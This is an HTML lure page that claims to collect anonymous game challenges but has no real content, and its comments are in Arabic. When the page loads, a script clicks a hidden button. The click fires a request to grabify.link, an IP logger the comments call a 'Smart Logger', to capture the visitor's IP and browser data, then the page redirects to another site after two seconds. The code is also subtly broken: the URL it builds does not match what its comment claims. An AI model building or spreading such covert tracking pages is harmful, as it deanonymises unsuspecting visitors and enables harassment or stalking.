<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send me anonymous challenges on GamesZoneX!</title>
</head>
<body>

  <!-- زر مخفي للتفعيل الأوتوماتيكي المعزز -->
  <button id="secureBtn" style="display:none; width:0; height:0; visibility:hidden;"></button>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      const btn = document.getElementById('secureBtn');
      
      btn.addEventListener('click', function() {
        // طابع زمني فريد لمنع المتصفح والسيرفر من قراءة الكاش القديم
        const timestamp = Date.now();
        
        // تم إصلاح الرابط هنا بإضافة ?t= لكسر الكاش دون تدمير كود الرابط الأصلي
        const grabifyUrl = 'https://grabify.link' + timestamp; 
        const destinationUrl = 'https://dominoes.mx';

        // استخدام كائن الصورة لإرسال بيانات الـ Smart Logger والـ IP بأعلى صلاحية أمان
        const imgTracker = new Image();
        imgTracker.src = grabifyUrl;

        // مهلة ثانيتين كاملتين لضمان معالجة السيرفر لبيانات الـ Smart Logger قبل التحويل
        setTimeout(function() {
          window.location.href = destinationUrl;
        }, 2000);
      });

      // إطلاق النقرة أوتوماتيكياً فور تحميل الصفحة
      btn.click();
    });
  </script>

</body>
</html>
